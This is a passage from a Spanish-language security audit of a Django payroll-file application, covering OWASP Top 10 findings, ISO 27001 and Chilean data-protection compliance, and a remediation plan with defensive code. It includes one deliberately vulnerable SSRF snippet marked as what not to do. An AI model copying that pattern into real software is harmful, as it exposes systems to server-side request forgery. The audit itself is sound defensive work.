- Migrar tokens a httpOnly cookies
- Encriptar archivos Excel en disco

---

### ⚠️ A03:2021 - Injection
**Estado:** CRÍTICO ⚠️

**Vulnerabilidades encontradas:**
1. SQL Injection potencial en parsers (VULN #2)
2. Path traversal en uploads (VULN #1)
3. Sin sanitización de nombres de columna Excel

**Mitigaciones aplicadas:**
- Django ORM previene SQL injection básica ✅
- Falta validación de input en parsers ❌

---

### ⚠️ A04:2021 - Insecure Design
**Estado:** MEJORABLE ⚠️

**Fortalezas:**
- Arquitectura de roles bien definida
- Separación de archivos ERP vs Analista
- Versionado de archivos

**Debilidades:**
- Sin límite de filas en Excel (DoS) (VULN #8)
- Sin rate limiting (VULN #5)
- Ausencia de MFA para cuentas privilegiadas

---

### ❌ A05:2021 - Security Misconfiguration
**Estado:** CRÍTICO ❌

**Problemas:**
1. DEBUG con fallback `True` si no se configura
2. CORS permisivo (VULN #7)
3. Sin HTTPS forzado (VULN #9)
4. Secrets débiles por defecto (VULN #3)

**Remediación:** Ver sección de VULN #3, #7, #9

---

### ⚠️ A06:2021 - Vulnerable and Outdated Components
**Estado:** DESCONOCIDO ⚠️

**Dependencias actuales:** (de `requirements.txt`)
- Django>=5.0 ✅ (actualizado)
- pandas>=2.1 ✅ (actualizado)
- celery>=5.3 ✅ (actualizado)

**Recomendación:**
```bash
# Escanear vulnerabilidades conocidas
pip install safety
safety check -r requirements.txt

# Actualizar regularmente
pip-audit
```

---

### ⚠️ A07:2021 - Identification and Authentication Failures
**Estado:** ALTO RIESGO ⚠️

**Vulnerabilidades críticas:**
1. JWT en localStorage (VULN #4) → robo de sesión
2. Sin rate limiting en login (VULN #5) → brute force
3. Sin MFA para Gerentes
4. Password validators insuficientes (VULN #10)
5. Refresh tokens sin revocación manual

**Remediación:**
- Implementar MFA con TOTP (google-authenticator-libpam)
- Blacklist de refresh tokens en logout
- Passwords de 12+ caracteres con complejidad

---

### ⚠️ A08:2021 - Software and Data Integrity Failures
**Estado:** MEJORABLE ⚠️

**Fortalezas:**
- Celery con JSON serializer (no pickle) ✅
- Auditoría de cambios en AuditLog ✅

**Debilidades:**
- Logs de auditoría sin hash de integridad (VULN #15)
- Sin firma digital de archivos Excel subidos
- Falta checksum de archivos media

---

### ❌ A09:2021 - Security Logging and Monitoring Failures
**Estado:** CRÍTICO ❌

**Problemas:**
1. PII en logs (VULN #6) → violación Ley 21.719
2. Sin alertas en tiempo real
3. Logs sin centralización (no hay Sentry/ELK)
4. Ausencia de detección de anomalías

**Remediación:**
- Implementar sanitización de logs (ver VULN #6)
- Integrar Sentry para alertas
- Configurar ELK Stack o Datadog

---

### ⚠️ A10:2021 - Server-Side Request Forgery (SSRF)
**Estado:** NO APLICABLE ⚠️

El sistema no hace requests a URLs proporcionadas por el usuario. Sin embargo:

**Precaución:** Si en el futuro se implementa descarga de archivos desde URLs:
```python
# NO HACER:
url = request.data.get('url')
response = requests.get(url)  # ⚠️ SSRF vulnerable

# HACER:
ALLOWED_DOMAINS = ['trusted-erp.com', 's3.amazonaws.com']
parsed = urlparse(url)
if parsed.netloc not in ALLOWED_DOMAINS:
    raise ValidationError("Dominio no autorizado")
```

---

## 🛡️ COMPLIANCE: ISO 27001 / Ley 21.719

### ISO 27001:2022 - Controles Aplicables

#### ✅ A.8.15 - Logging
**Estado:** COMPLIANT ✅

- Implementado `AuditLog` con captura de CRUD
- Registro de usuario, IP, timestamp, acción
- Retención de 90 días

**Evidencia:** `backend/apps/core/models/audit.py`

**Mejoras recomendadas:**
- Agregar hash de integridad (VULN #15)
- Exportar logs a sistema inmutable (S3 Glacier)

---

#### ⚠️ A.8.16 - Monitoring Activities
**Estado:** PARCIAL ⚠️

**Implementado:**
- Logs estructurados
- Celery task tracking

**Faltante:**
- Sin alertas en tiempo real
- Sin dashboard de monitoreo de seguridad
- Sin análisis de anomalías

**Remediación:**
```python
# Integrar Sentry para alertas
# backend/config/settings/production.py
import sentry_sdk
from sentry_sdk.integrations.django import DjangoIntegration

sentry_sdk.init(
    dsn=os.environ.get('SENTRY_DSN'),
    integrations=[DjangoIntegration()],
    traces_sample_rate=0.1,
    send_default_pii=False,  # Cumplimiento Ley 21.719
)
```

---

#### ❌ A.8.2 - Privileged Access Rights
**Estado:** NO COMPLIANT ❌

**Problemas:**
1. Sin MFA para Gerentes (acceso privilegiado)
2. Sin rotación forzada de credenciales
3. SESSION_COOKIE_AGE sin límite
4. Sin auditoría de cambios en permisos de usuario

**Remediación:**
```python
# Forzar MFA para Gerentes
# backend/apps/core/models/usuario.py
class Usuario(AbstractBaseUser):
    mfa_enabled = models.BooleanField(default=False)
    mfa_secret = models.CharField(max_length=32, blank=True)
    
    def clean(self):
        # Forzar MFA para gerentes
        if self.tipo_usuario == TipoUsuario.GERENTE and not self.mfa_enabled:
            raise ValidationError("Gerentes deben tener MFA habilitado")

# Configurar expiración de sesión
# backend/config/settings/base.py
SESSION_COOKIE_AGE = 8 * 60 * 60  # 8 horas
SESSION_SAVE_EVERY_REQUEST = True
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
```

---

#### ⚠️ A.8.4 - Access to Source Code
**Estado:** PARCIAL ⚠️

**Implementado:**
- Git con historial completo
- .gitignore excluye secrets ✅

**Faltante:**
- Sin pre-commit hooks para detectar secrets
- Sin escaneo de código con SonarQube/Snyk

**Remediación:**
```bash
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

# Instalar
pip install pre-commit
pre-commit install
```

---

### Ley 21.719 (Chile) - Protección de Datos Personales

#### Art. 10 - Deber de Confidencialidad
**Estado:** VULNERABLE ❌

**Problema:** PII en logs (VULN #6) viola confidencialidad

**Datos personales procesados:**
- RUT (identificador único)
- Nombre completo
- Sueldo y remuneraciones
- AFP, Isapre (datos de salud)
- Dirección IP en logs

**Remediación:** Implementar sanitización de logs (ver VULN #6)

---

#### Art. 15 - Medidas de Seguridad
**Estado:** INSUFICIENTE ❌

**Requisitos de la ley:**
1. ✅ Cifrado de datos en tránsito (HTTPS)
2. ❌ Cifrado de datos en reposo (archivos Excel sin encriptar)
3. ⚠️ Control de acceso (implementado pero sin MFA)
4. ❌ Pseudonimización/anonimización (no implementada)

**Remediación - Encriptar archivos en disco:**
```python
# backend/apps/validador/models/archivo.py
from django.core.files.storage import FileSystemStorage
from cryptography.fernet import Fernet

class EncryptedFileSystemStorage(FileSystemStorage):
    """Storage que encripta archivos al guardar."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        key = os.environ.get('FILE_ENCRYPTION_KEY').encode()
        self.cipher = Fernet(key)
    
    def _save(self, name, content):
        # Encriptar contenido
        encrypted_data = self.cipher.encrypt(content.read())
        
        # Guardar encriptado
        encrypted_file = ContentFile(encrypted_data)
        return super()._save(name, encrypted_file)
    
    def _open(self, name, mode='rb'):
        # Leer encriptado
        encrypted_file = super()._open(name, mode)
        encrypted_data = encrypted_file.read()
        
        # Desencriptar
        decrypted_data = self.cipher.decrypt(encrypted_data)
        return ContentFile(decrypted_data)

# Usar en modelo
class ArchivoBase(models.Model):
    archivo = models.FileField(
        upload_to=archivo_upload_path,
        storage=EncryptedFileSystemStorage()  # Archivos encriptados
    )
```

---

#### Art. 20 - Notificación de Brechas
**Estado:** NO IMPLEMENTADO ❌

**Requisito:** Notificar a afectados dentro de 72 horas de detectada una brecha.

**Remediación:**
```python
# backend/apps/core/services/breach_notification.py
class BreachNotificationService:
    """Servicio para gestionar notificación de brechas según Ley 21.719."""
    
    @staticmethod
    def notify_breach(
        tipo_brecha: str,
        datos_afectados: dict,
        usuarios_afectados: list,
        fecha_deteccion: datetime
    ):
        """
        Notifica una brecha de seguridad.
        
        Args:
            tipo_brecha: Tipo de incidente (acceso no autorizado, pérdida, etc.)
            datos_afectados: Qué datos personales fueron comprometidos
            usuarios_afectados: IDs de usuarios afectados
            fecha_deteccion: Cuándo se detectó la brecha
        """
        # 1. Registrar en auditoría
        from apps.core.models import AuditLog
        AuditLog.objects.create(
            accion='breach_detected',
            modelo='security.breach',
            datos_nuevos={
                'tipo': tipo_brecha,
                'datos_afectados': datos_afectados,
                'usuarios_count': len(usuarios_afectados),
                'fecha_deteccion': fecha_deteccion.isoformat(),
            }
        )
        
        # 2. Notificar autoridad (72 horas)
        # TODO: Integrar con API de ANPD (Agencia Nacional de Protección de Datos)
        
        # 3. Notificar usuarios afectados
        for usuario_id in usuarios_afectados:
            # Enviar email
            send_breach_notification_email(usuario_id, tipo_brecha, datos_afectados)
        
        # 4. Alerta interna inmediata
        logger.critical(
            f"BRECHA DE SEGURIDAD DETECTADA: {tipo_brecha}. "
            f"Usuarios afectados: {len(usuarios_afectados)}. "
            f"Notificación en proceso."
        )
```

---

## 🚀 QUICK WINS (Fixes Rápidos de Alto Impacto)

### 1. Validación Robusta de Uploads (30 min) 🔴
**Impacto:** CRÍTICO  
**Esfuerzo:** Bajo

```bash
pip install python-magic
# Implementar validate_archivo() mejorado (ver VULN #1)
```

### 2. Generar y Forzar Secrets Fuertes (15 min) 🔴
**Impacto:** CRÍTICO  
**Esfuerzo:** Muy Bajo

```bash
./scripts/generate_secrets.sh > .env.production
# Validar longitud en settings.py (ver VULN #3)
```

### 3. Rate Limiting en Login (20 min) 🟠
**Impacto:** ALTO  
**Esfuerzo:** Bajo

```python
# Agregar throttle_classes en urls.py (ver VULN #5)
```

### 4. Sanitización de Logs (45 min) 🟠
**Impacto:** ALTO (Compliance Ley 21.719)  
**Esfuerzo:** Medio

```python
# Implementar sanitize_for_log() (ver VULN #6)
```

### 5. Migrar JWT a httpOnly Cookies (2 horas) 🟠
**Impacto:** ALTO  
**Esfuerzo:** Medio

```python
# Modificar LoginView y authStore (ver VULN #4)
```

### 6. CORS Estricto (10 min) 🟠
**Impacto:** ALTO  
**Esfuerzo:** Muy Bajo

```python
# Configurar CORS_ALLOWED_ORIGINS (ver VULN #7)
```

### 7. Forzar HTTPS en Producción (5 min) 🟡
**Impacto:** MEDIO  
**Esfuerzo:** Muy Bajo

```python
SECURE_SSL_REDIRECT = True  # settings/production.py
```

### 8. Límite de Filas en Excel (30 min) 🟡
**Impacto:** MEDIO (DoS prevention)  
**Esfuerzo:** Bajo

```python
# Modificar leer_excel() con max_rows (ver VULN #8)
```

### 9. Headers de Seguridad (10 min) 🔵
**Impacto:** BAJO  
**Esfuerzo:** Muy Bajo

```python
# Agregar todos los headers en production.py (ver VULN #18)
```

### 10. Pre-commit Hooks (15 min) 🔵
**Impacto:** BAJO (prevención)  
**Esfuerzo:** Bajo

```bash
pip install pre-commit detect-secrets
pre-commit install
```

---

## 📋 PRIORIZACIÓN DE REMEDIACIÓN

### FASE 1 - CRÍTICO (ANTES DE PRODUCCIÓN) ⛔
**Deadline:** Inmediato

1. ✅ VULN #1: Validación robusta de uploads
2. ✅ VULN #2: Prevenir SQL injection en parsers
3. ✅ VULN #3: Secrets fuertes y sin fallbacks
4. ✅ VULN #4: Migrar JWT a httpOnly cookies
5. ✅ VULN #5: Rate limiting en autenticación

**Tiempo estimado:** 4-6 horas  
**Bloquea producción:** SÍ ⛔

---

### FASE 2 - ALTO (PRIMERA SEMANA)
**Deadline:** 7 días

1. VULN #6: Sanitización de PII en logs
2. VULN #7: CORS estricto
3. VULN #8: Límite de filas en Excel
4. Implementar MFA para Gerentes
5. Configurar Sentry para alertas

**Tiempo estimado:** 2-3 días  
**Impacto compliance:** Alto

---

### FASE 3 - MEDIO (PRIMER MES)
**Deadline:** 30 días

1. VULN #9-15: Todas las vulnerabilidades medias
2. Encriptación de archivos en disco
3. Hash de integridad en AuditLog
4. Documentación OpenAPI/Swagger
5. Tests de seguridad automatizados

**Tiempo estimado:** 1-2 semanas

---

### FASE 4 - MEJORA CONTINUA
**Deadline:** Ongoing

1. Monitoreo con ELK Stack
2. Pentesting externo
3. Certificación ISO 27001
4. Auditoría de compliance Ley 21.719
5. Programa de bug bounty

---

## 🎯 RECOMENDACIONES FINALES

### Para el Equipo de Desarrollo

1. **Security Champion:** Asignar 1 desarrollador como responsable de seguridad
2. **Training:** Capacitación OWASP Top 10 para todo el equipo
3. **Code Review:** Checklist de seguridad en cada PR
4. **Testing:** Agregar tests de seguridad en CI/CD

### Para DevOps

1. **Secrets Management:** Migrar a HashiCorp Vault o AWS Secrets Manager
2. **WAF:** Implementar CloudFlare o AWS WAF
3. **Backups:** Encriptar backups y probar restauración
4. **Monitoring:** Sentry + Datadog + alertas PagerDuty

### Para Management

1. **Budget:** Asignar presupuesto para pentesting externo ($5k-$10k USD)
2. **Insurance:** Considerar cyber insurance para cobertura de brechas
3. **Compliance:** Contratar consultor Ley 21.719 para auditoría externa
4.
